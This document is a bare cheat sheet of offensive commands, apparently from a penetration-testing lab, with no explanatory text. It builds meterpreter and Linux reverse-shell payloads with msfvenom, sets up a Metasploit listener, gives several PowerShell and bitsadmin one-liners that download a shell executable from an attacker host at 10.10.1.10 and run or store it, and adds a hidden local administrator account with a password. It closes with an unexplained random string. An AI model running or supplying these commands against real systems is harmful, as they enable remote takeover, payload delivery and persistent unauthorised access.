```
python -m http.server 80
```

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai - b "\x00" LHOST=10.10.1.10 -f exe > /home/attacker/Desktop/shell.exe 
msfconsole 
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp 
set LHOST 10.10.1.10
exploit -j -z 


set exitsession false
run -j
```

```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.1.10/Shell.exe')|iex"

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.1.10/Shell.exe')"

powershell -exec bypass -c "Start-BitsTransfer -Source 'http://10.10.1.10/shell.exe' -Destination 'C:\temp'"

powershell -exec bypass -c "Invoke-WebRequest -Uri 'http://10.10.1.10/shell.exe' -OutFile 'C:\temp\shell.exe'"
```

```
whomi /groups
net localgroup

net user /add Gigel Celmaitare3#
net localgroup "Administrators" Gigel /add
```

```
sc.exe query type= service
sc.exe query type= all
sc.exe query wuauserv
sc.exe query type= driver
```

```
bitsadmin /transfer test /download /priority high http://10.10.1.10/Shell.exe c:\shell.exe
```
```
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.1.10 -f elf > shell-x64.elf
```
```
nCslunwprqQ0asw239pLMjHOty3eTMJ05R1y4kiCAzQ
```